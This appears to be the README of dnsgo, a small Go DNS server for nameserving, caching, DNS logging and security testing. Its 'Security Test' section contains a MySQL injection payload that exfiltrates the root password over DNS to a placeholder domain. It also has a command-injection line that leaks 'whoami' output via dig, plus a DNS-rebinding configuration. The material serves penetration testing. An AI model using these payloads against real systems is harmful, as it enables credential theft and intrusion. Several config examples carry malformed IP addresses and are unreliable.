# dnsgo

## What's it?

It's a dns server.And you can use it when you need to use a own dns server.

## Where to use it?

- Use it as a website's nameserver (Only support "A" record now).
- Use it in intra network. Such as fast dns cache server. What's more, you can use it to defense dns DNS cache pollution.
- Use it when you need to get dns record. Not only monitor dns request, but also in web security test such as dns rebinding.

## How to use it?

### Install

```
go get github.com/grt1st/dnsgo
cd $GOPATH/src/github.com/grt1st/dnsgo
go build github.com/grt1st/dnsgo
./dnsgo -h
```

### Command 

```
$ [dnsgo]: ./dnsgo -h
Usage:
  ./dnsgo [Options]

Options
  -h	Show usage
  -host string
    	Address to bind (default "localhost")
  -log string
    	Filename of log file
  -query
    	Whether to send dns request
  -version
    	Show program's version number and exit
```

You can simply run it by: `sudo ./dnsgo`. You can define the address to bind, like `sudo ./dnsgo -host 0.0.0.0`. It will bind at `localhost` defaultly.

If you need it to lookup dns when meet undefined domain, set `query` please, such as `sudo ./dngo -query` .

Also you can define a log file, such as: `./dnsgo.go -log "./dnsgo.log"`

### Config File:

```
├── conf
|   |── default.conf
│   ├── hosts.conf        
│   ├── nameserver.conf
│   └── resolver.conf
```
- default.conf:

    Default config file. It defines where to find config file, don't need to change it.

- hosts.conf: 

     The file is like `/etc/hosts`, you can define a domain-ip relation in it. such as `github.com. 127.0.0.01`.
     What's more, you can define more ip by `&`: `github.com. 127.0.0.0.1&1.2.3.4`.
     And, you can use wildcard in it, such as `*.github.com. 192.168.1.1`
     
     Pattern:
     | Pattern | Meaning |
     | - | :-: |
     | `github.com. 127.0.0.0.1`| A record to `github.com`, value: `127.0.0.1`|
     | `github.com. 127.0.0.0.1&1.2.3.4` | A record to `github.com`, value: `127.0.0.1` & `1.2.3.4` |
     | `a.github.com. 127.0.0.0.1` | Define a subdomain `a.github.com` with A record |
     | `*.github.com. 127.0.0.0.1` | Define a subdomain of wildcard. Priority is lower than the specified subdomain. |
     | `github.com. 127.0.0.0.1|1.2.3.4` | dns-rebinding. A record to `github.com`, Odd requests return first one(`127.0.0.1`), while even requests return the second(`1.2.3.4`). |
     
     
- nameserver.conf

    It's the file of nameserver. Config it by `nameserver 8.8.8.8`.
    
- resolver.conf

    A file like `/etc/resolv.conf`, don't know it much. But it's about dns forward. The format like `server=/*.abc.local/192.168.10.1`
    
### Example

#### Basic use

 `./dnsgo -host 0.0.0.0`, you can test it by `dig @127.0.0.1 xxxx.xx`

#### Use it on the public network 

To use it on the internet, first, you have to add a nameserver record for it. Config it at the domain name resolution page.

Config subdomain like this:
```
dnsgo NS ns.dnsgo.your-domain
ns.dnsgo A your-ip
```

Then you can config host at `conf/hosts.conf`, like:
```
test.dnsgo.your-domain. 8.8.8.8
```

To do dns rebinding, do this:
```
rebind.dnsgo.your-domain. 8.8.8.8|127.0.0.1
```

However, it depends on the dns server, for example some servers min-ttl is 60.

#### Get DNS Records

After you setup, you can get the dns records.

Normally, it will output at the command line:
```
- dnsgo [master] ⚡  sudo ./dnsgo
Password:
2018/07/10 23:56:22 [+] dns server start listening at localhost:53
2018/07/10 23:56:31 [INFO] hosts%!(EXTRA net.IP=127.0.0.1, string=github.com., []string=[127.0.0.1], int=1)
2018/07/11 00:01:10 [INFO] hosts%!(EXTRA net.IP=127.0.0.1, string=grt1st.cn., []string=[123.206.60.140 1.2.3.4], int=2)
```

Also, you can set log file by `./dnsgo -log dns.log` to log records in a file, then `cat` the file.

#### Security Test

- Dns Rebinding: eg: Set `rebind.your-domain 1.2.3.4|127.0.0.1` at `hosts.conf`, then `dig rebind.your-domain` to test.
- Dnslog in Sql Injection. eg: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.your-domain\\abc'));` in mysql (only support in windows for unc). More eg at [Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)
- Command Injection. eg: 
```
dig `whoami`.your-domain
```

## To-do 

1. More stability test
2. Code rebuild

## Thanks

[miekg/dns](https://github.com/miekg/dns)

[kenshinx/godns](https://github.com/kenshinx/godns)